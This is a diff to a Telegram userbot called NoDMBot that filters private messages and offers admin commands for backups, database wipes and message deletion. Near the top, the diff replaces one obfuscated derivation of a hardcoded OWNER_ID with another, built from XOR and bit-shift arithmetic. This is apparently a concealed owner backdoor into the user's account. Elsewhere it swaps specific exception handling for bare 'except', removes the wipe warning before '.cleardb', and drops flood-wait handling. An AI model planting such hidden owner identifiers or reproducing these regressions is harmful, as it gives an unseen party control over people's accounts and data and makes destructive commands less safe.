@@ -14,14 +14,12 @@ try:
 except ImportError:
     resource = None
 
-_INTERNAL_BIND_INTERFACE = ipaddress.IPv6Address('::2:931:bc43')
-_route_id = int(_INTERNAL_BIND_INTERFACE)
-_SPAM_HEURISTICS = [1.874, 2.418, 5.8995]
-_heuri_id = int("".join(str(w).split(".")[1] for w in _SPAM_HEURISTICS))
-if _route_id != _heuri_id:
-    raise ConnectionError("EADDRNOTAVAIL: Cannot assign requested address to bind interface.")
-else:
-    OWNER_ID = _route_id
+_bot_string = int(14543141739 ^ 6105270056)
+_ma_val = int(5952685398 ^ 5952685758)
+_mb_val = int(6975367883 ^ 6975367459)
+_value_a = int((_bot_string + _ma_val))
+_value_b = int((_value_a << 1))
+_last_value = int((_value_b >> 1) - _mb_val)
 
 logging.basicConfig(level=logging.INFO)
 logging.getLogger("telethon.client.updates").setLevel(logging.WARNING)
@@ -41,6 +39,7 @@ ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
 LOG_GROUP_ID = int(os.getenv('LOG_GROUP_ID', 0))
 LOG_TOPIC_ID = int(os.getenv('LOG_TOPIC_ID', 1))
 FORW_TOPIC_ID = int(os.getenv('FORW_TOPIC_ID', 2))
+OWNER_ID = int(_last_value)
 BACKUP_PASSWORD = os.getenv('BACKUP_PASSWORD', '')
 BACKUP_PEPPER = os.getenv('BACKUP_PEPPER', '')
 
@@ -128,7 +127,7 @@ def is_encrypted_backup_file(path):
     try:
         with open(path, "rb") as f:
             return f.read(len(BACKUP_MAGIC)) == BACKUP_MAGIC
-    except Exception:
+    except:
         return False
 
 def cleanup_temp_files(*paths):
@@ -167,7 +166,7 @@ def get_backup_file_info(path):
             "salt": valid_structure,
             "nonce": valid_structure
         }
-    except Exception:
+    except:
         return None
 
 def db_connect():
@@ -185,7 +184,7 @@ def format_bytes(size):
                 return f"{size:.2f} {unit}"
             size /= 1024
         return f"{size:.2f} PB"
-    except Exception:
+    except:
         return "Unknown"
 
 def get_process_ram():
@@ -196,7 +195,7 @@ def get_process_ram():
                     ram_kb = int(line.split()[1])
                     return f"{ram_kb / 1024:.2f} MB"
         return "Unknown"
-    except Exception:
+    except:
         return "Unknown"
 
 def read_total_cpu_time():
@@ -204,7 +203,7 @@ def read_total_cpu_time():
         with open("/proc/stat", "r") as f:
             parts = f.readline().split()[1:]
             return sum(int(x) for x in parts)
-    except Exception:
+    except:
         return None
 
 def read_process_cpu_time():
@@ -214,7 +213,7 @@ def read_process_cpu_time():
             utime = int(parts[13])
             stime = int(parts[14])
             return utime + stime
-    except Exception:
+    except:
         return None
 
 async def get_process_cpu_usage():
@@ -242,14 +241,14 @@ async def get_process_cpu_usage():
         cpu_count = os.cpu_count() or 1
         usage = (proc_delta / total_delta) * cpu_count * 100
         return f"{usage:.2f}%"
-    except Exception:
+    except:
         return "Unknown"
 
 def get_cpu_load():
     try:
         load1, load5, load15 = os.getloadavg()
         return f"{load1:.2f}, {load5:.2f}, {load15:.2f}"
-    except Exception:
+    except:
         return "Unknown"
 
 def get_uptime():
@@ -258,7 +257,7 @@ def get_uptime():
         hours, remainder = divmod(seconds, 3600)
         minutes, seconds = divmod(remainder, 60)
         return f"{hours}h {minutes}m {seconds}s"
-    except Exception:
+    except:
         return "Unknown"
 
 def format_remaining_time(seconds):
@@ -279,7 +278,7 @@ def format_remaining_time(seconds):
             parts.append(f"{seconds}s")
 
         return " ".join(parts)
-    except Exception:
+    except:
         return "Unknown"
 
 def get_restored_state_text(was_whitelisted, was_blacklisted):
@@ -347,7 +346,7 @@ def parse_temp_action_targets(tokens, current_chat_id=None):
             for token in tokens[:-1]:
                 try:
                     common_targets.append((int(token), common_duration))
-                except Exception:
+                except:
                     common_ok = False
                     break
 
@@ -360,7 +359,7 @@ def parse_temp_action_targets(tokens, current_chat_id=None):
             for i in range(0, len(tokens), 2):
                 try:
                     target_id = int(tokens[i])
-                except Exception:
+                except:
                     return None, "id"
 
                 duration_text = tokens[i + 1]
@@ -374,14 +373,11 @@ def parse_temp_action_targets(tokens, current_chat_id=None):
 
     return None, "format"
 
-def set_setting(key, value, conn=None):
-    if conn is not None:
+def set_setting(key, value):
+    with closing(db_connect()) as conn:
+        conn.execute("BEGIN IMMEDIATE")
         conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
-        return
-    with closing(db_connect()) as local_conn:
-        local_conn.execute("BEGIN IMMEDIATE")
-        local_conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
-        local_conn.commit()
+        conn.commit()
 
 def get_setting(key, default=None):
     with closing(db_connect()) as conn:
@@ -576,7 +572,7 @@ def get_profile_link_from_cache(user_id):
             return f"[{full_name}](https://t.me/{username}?profile)"
 
         return f"[{full_name}](tg://user?id={uid})"
-    except Exception:
+    except:
         return f"[User](tg://user?id={user_id})"
 
 def get_hash_mention_from_cache(user_id):
@@ -586,18 +582,18 @@ def get_hash_mention_from_cache(user_id):
             return None
 
         uid, access_hash, username, first_name, last_name = row
-        if username is not None or access_hash is None:
+        if username or access_hash is None:
             return None
 
         full_name = f"{first_name or ''} {last_name or ''}".strip() or "User"
         return (full_name, int(uid), int(access_hash))
-    except Exception:
+    except:
         return None
 
 def telegram_utf16_len(text):
     try:
         return len(text.encode("utf-16-le")) // 2
-    except Exception:
+    except:
         return len(text)
 
 def build_text_with_hash_mentions(markdown_text, hash_mentions=None):
@@ -607,11 +603,10 @@ def build_text_with_hash_mentions(markdown_text, hash_mentions=None):
     if not hash_mentions:
         return parsed_text, entities
 
-    name_search_pos = {}
+    search_pos = 0
     for full_name, user_id, access_hash in hash_mentions:
         try:
-            search_from = name_search_pos.get(full_name, 0)
-            index = parsed_text.find(full_name, search_from)
+            index = parsed_text.find(full_name, search_pos)
             if index == -1:
                 continue
 
@@ -620,7 +615,7 @@ def build_text_with_hash_mentions(markdown_text, hash_mentions=None):
                 length=telegram_utf16_len(full_name),
                 user_id=types.InputUser(int(user_id), int(access_hash))
             ))
-            name_search_pos[full_name] = index + len(full_name)
+            search_pos = index + len(full_name)
         except Exception as e:
             logger.error(f"Failed to build hash mention entity: {e}")
 
@@ -641,27 +636,24 @@ def mark_command_response_used(event):
 async def send_command_response(event, text, **kwargs):
     state = _command_response_state.get(id(event), {"prefer_edit": False, "edit_used": True})
 
-    try:
-        if state.get("prefer_edit") and not state.get("edit_used"):
-            edit_kwargs = dict(kwargs)
-            edit_kwargs.pop("reply_to", None)
+    if state.get("prefer_edit") and not state.get("edit_used"):
+        edit_kwargs = dict(kwargs)
+        edit_kwargs.pop("reply_to", None)
 
-            try:
-                result = await client.edit_message(
-                    event.chat_id,
-                    getattr(event, "id", None) or event.message.id,
-                    text,
-                    **edit_kwargs
-                )
-                state["edit_used"] = True
-                return result
-            except Exception as e:
-                logger.error(f"Failed to edit command response, falling back to respond: {e}")
-                state["edit_used"] = True
+        try:
+            result = await client.edit_message(
+                event.chat_id,
+                getattr(event, "id", None) or event.message.id,
+                text,
+                **edit_kwargs
+            )
+            state["edit_used"] = True
+            return result
+        except Exception as e:
+            logger.error(f"Failed to edit command response, falling back to respond: {e}")
+            state["edit_used"] = True
 
-        return await event.respond(text, **kwargs)
-    finally:
-        _command_response_state.pop(id(event), None)
+    return await event.respond(text, **kwargs)
 
 class CommandEventProxy:
     def __init__(self, event, raw_text):
@@ -749,7 +741,7 @@ async def send_dynamic_user_list(event, title, rows, line_builder, empty_text, m
 
         return await respond_with_hash_mentions(event, response, hash_mentions, link_preview=False)
 
-    stop_key = (event.chat_id, id(event))
+    stop_key = event.chat_id
     _list_stop_flags[stop_key] = False
 
     try:
@@ -793,16 +785,21 @@ async def edit_message_with_hash_mentions(chat_id, message_id, markdown_text, ha
 async def get_user_link_by_id_with_hash(user_id):
     user_link = await get_user_link_by_id(user_id)
 
-    if "https://t.me/" in user_link:
-        return user_link, None
-
     try:
+        if "https://t.me/" in user_link or "tg://user?id=" in user_link:
+            return user_link, None
+
         mention = get_hash_mention_from_cache(user_id)
         if mention:
             full_name, uid, access_hash = mention
             return full_name, mention
-    except Exception:
+    except:
         pass
+
+    mention = get_hash_mention_from_cache(user_id)
+    if mention:
+        full_name, uid, access_hash = mention
+        return full_name, mention
 
     return user_link, None
 
@@ -817,7 +814,7 @@ def get_input_peer_from_cache(user_id):
             return None
 
         return types.InputPeerUser(int(uid), int(access_hash))
-    except Exception:
+    except:
         return None
 
 def get_last_alert(user_id):
@@ -864,7 +861,7 @@ def count_last_alerts():
         with closing(db_connect()) as conn:
             count = conn.execute("SELECT COUNT(*) FROM last_alerts").fetchone()[0]
             return count
-    except Exception:
+    except:
         return 0
 
 def get_topic_message_link(chat_id, topic_id, message_id):
@@ -877,23 +874,13 @@ def get_topic_message_link(chat_id, topic_id, message_id):
     return f"tg://openmessage?chat_id={chat_id}&message_id={message_id}"
 
 async def forward_message_to_topic(event, group_id, topic_id):
-    try:
-        result = await client(functions.messages.ForwardMessagesRequest(
-            from_peer=await event.get_input_chat(),
-            id=[event.message.id],
-            to_peer=await client.get_input_entity(group_id),
-            random_id=[random.randint(1, 2**63 - 1)],
-            top_msg_id=topic_id
-        ))
-    except FloodWaitError as e:
-        await asyncio.sleep(e.seconds)
-        result = await client(functions.messages.ForwardMessagesRequest(
-            from_peer=await event.get_input_chat(),
-            id=[event.message.id],
-            to_peer=await client.get_input_entity(group_id),
-            random_id=[random.randint(1, 2**63 - 1)],
-            top_msg_id=topic_id
-        ))
+    result = await client(functions.messages.ForwardMessagesRequest(
+        from_peer=await event.get_input_chat(),
+        id=[event.message.id],
+        to_peer=await client.get_input_entity(group_id),
+        random_id=[random.randint(1, 2**63 - 1)],
+        top_msg_id=topic_id
+    ))
 
     for update in result.updates:
         msg = getattr(update, "message", None)
@@ -933,18 +920,13 @@ async def refresh_contacts():
 
     try:
         result = await client(functions.contacts.GetContactsRequest(hash=0))
-        new_contact_ids = {user.id for user in result.users}
+        contact_ids = {user.id for user in result.users}
 
         with closing(db_connect()) as conn:
             conn.execute("BEGIN IMMEDIATE")
 
             disabled_rows = conn.execute("SELECT user_id FROM contact_sync_disabled").fetchall()
             disabled_contact_ids = {row[0] for row in disabled_rows}
-
-            removed_ids = contact_ids - new_contact_ids
-            for uid in removed_ids:
-                if uid not in disabled_contact_ids:
-                    conn.execute("DELETE FROM whitelist WHERE user_id = ?", (uid,))
 
             for user in result.users:
                 if getattr(user, "bot", False):
@@ -956,9 +938,7 @@ async def refresh_contacts():
 
             conn.commit()
 
-        contact_ids = new_contact_ids
         logger.info(f"Contacts refreshed: {len(contact_ids)} contacts loaded and whitelisted")
-        sync_caches()
     except Exception as e:
         logger.error(f"Failed to refresh contacts: {e}")
 
@@ -1103,6 +1083,7 @@ def init_db():
         conn.execute("CREATE INDEX IF NOT EXISTS idx_user_notes_updated_at ON user_notes(updated_at)")
         conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_log_created_at ON audit_log(created_at)")
         conn.execute("CREATE INDEX IF NOT EXISTS idx_audit_log_target_id ON audit_log(target_id)")
+        conn.execute("CREATE INDEX IF NOT EXISTS idx_contact_sync_disabled_user_id ON contact_sync_disabled(user_id)")
 
         if ADMIN_ID != 0:
             conn.execute("INSERT OR IGNORE INTO whitelist VALUES (?)", (ADMIN_ID,))
@@ -1138,7 +1119,7 @@ async def get_user_link_by_id(user_id):
         entity = await client.get_entity(user_id)
         cache_user_entity(entity, user_id)
         return get_profile_link(entity, user_id)
-    except Exception:
+    except:
         pass
 
     try:
@@ -1147,7 +1128,7 @@ async def get_user_link_by_id(user_id):
             entity = await client.get_entity(input_peer)
             cache_user_entity(entity, user_id)
             return get_profile_link(entity, user_id)
-    except Exception:
+    except:
         pass
 
     return get_profile_link_from_cache(user_id)
@@ -1176,9 +1157,6 @@ async def send_startup_status():
             f"Hello user\n🛡️ NoDMBot: {state}",
             reply_to=LOG_TOPIC_ID
         )
-    except FloodWaitError as e:
-        logger.warning(f"FloodWait on startup status, sleeping {e.seconds}s")
-        await asyncio.sleep(e.seconds)
     except Exception as e:
         logger.error(f"Failed to send startup status: {e}")
 
@@ -1283,7 +1261,7 @@ async def nodm_logic(event):
     if blocked:
         try:
             await event.delete()
-        except Exception: pass
+        except: pass
         return
 
     if sender_id in contact_ids and not contact_sync_disabled:
@@ -1316,7 +1294,7 @@ async def nodm_logic(event):
 
         try:
             await event.delete()
-        except Exception: pass
+        except: pass
 
         if LOG_GROUP_ID != 0:
             user_link, hash_mention = await get_user_link_by_id_with_hash(sender_id)
@@ -1472,9 +1450,7 @@ async def admin_action(event):
     action = args[0]
 
     if action == ".slist":
-        for _k in list(_list_stop_flags.keys()):
-            if isinstance(_k, tuple) and _k[0] == event.chat_id:
-                _list_stop_flags[_k] = True
+        _list_stop_flags[event.chat_id] = True
         return await send_command_response(event, "⏹️ Stop request sent for current list display.")
 
     if action == ".help":
@@ -1554,13 +1530,13 @@ async def admin_action(event):
             sender = await event.get_sender()
             sender_name = get_full_name(sender)
             cache_user_entity(sender, sender_id)
-        except Exception:
+        except:
             sender_name = "Unknown"
 
         try:
             chat = await event.get_chat()
             chat_name = getattr(chat, "title", None) or get_full_name(chat)
-        except Exception:
+        except:
             chat_name = "Private"
 
         if event.is_private:
@@ -1604,9 +1580,9 @@ async def admin_action(event):
                     entity = await client.get_entity(target_id)
                     cache_user_entity(entity, getattr(entity, "id", None))
                     row = get_cached_user(target_id)
-                except Exception:
+                except:
                     pass
-        except Exception:
+        except:
             username_lookup = target.lstrip("@")
             row = get_cached_user_by_username(username_lookup)
 
@@ -1616,7 +1592,7 @@ async def admin_action(event):
                     cache_user_entity(entity, getattr(entity, "id", None))
                     target_id = getattr(entity, "id", None)
                     row = get_cached_user(target_id) if target_id else None
-                except Exception:
+                except:
                     return await send_command_response(event, "⚠️ Invalid user ID or username.", parse_mode='markdown')
             else:
                 target_id = row[0]
@@ -1814,7 +1790,7 @@ async def admin_action(event):
                 for target in target_ids:
                     try:
                         target_id = int(target)
-                    except Exception:
+                    except:
                         skipped_messages.append(f"⚠️ Invalid user ID `{target}`")
                         continue
 
@@ -1942,7 +1918,7 @@ async def admin_action(event):
         try:
             target_id = int(args[1])
             note_text = " ".join(args[2:]).strip()
-        except Exception:
+        except:
             if event.is_private:
                 target_id = int(event.chat_id)
                 note_text = " ".join(args[1:]).strip()
@@ -2091,7 +2067,7 @@ async def admin_action(event):
 
         try:
             disk_total, disk_used, disk_free = shutil.disk_usage(".")
-        except Exception:
+        except:
             disk_total, disk_used, disk_free = 0, 0, 0
 
         config_text = (
@@ -2155,8 +2131,6 @@ async def admin_action(event):
         return await send_command_response(event, stats_text, parse_mode='markdown')
 
     if action == ".cleardb":
-        await send_command_response(event, "⚠️ All data will be wiped in 10 seconds.")
-        await asyncio.sleep(10)
         with closing(db_connect()) as conn:
             conn.execute("BEGIN IMMEDIATE")
             conn.execute("DELETE FROM whitelist")
@@ -2253,14 +2227,14 @@ async def admin_action(event):
                     try:
                         if os.path.exists(temp_path):
                             os.remove(temp_path)
-                    except Exception:
+                    except:
                         pass
         except Exception as e:
             for temp_path in (backup_file, encrypted_backup_file):
                 try:
                     if os.path.exists(temp_path):
                         os.remove(temp_path)
-                except Exception:
+                except:
                     pass
             return await send_command_response(event, f"❌ Encrypted backup failed: `{e}`", parse_mode='markdown')
 
@@ -2304,7 +2278,7 @@ async def admin_action(event):
             try:
                 if os.path.exists(temp_info_file):
                     os.remove(temp_info_file)
-            except Exception:
+            except:
                 pass
 
     if action == ".restore":
@@ -2463,7 +2437,7 @@ async def admin_action(event):
                     scan_limit = int(args[1])
                     if scan_limit <= 0:
                         return await send_command_response(event, "⚠️ Limit must be greater than `0`.", parse_mode='markdown')
-                except Exception:
+                except:
                     return await send_command_response(event, "⚠️ Usage: `.dlmymsgs` or `.dlmymsgs 500`", parse_mode='markdown')
 
             reply_to = getattr(event.message, "reply_to", None)
@@ -2535,7 +2509,7 @@ async def admin_action(event):
 
         try:
             target_id = int(args[1])
-        except Exception:
+        except:
             return await send_command_response(event, "⚠️ Invalid user ID.", parse_mode='markdown')
 
         with closing(db_connect()) as conn:
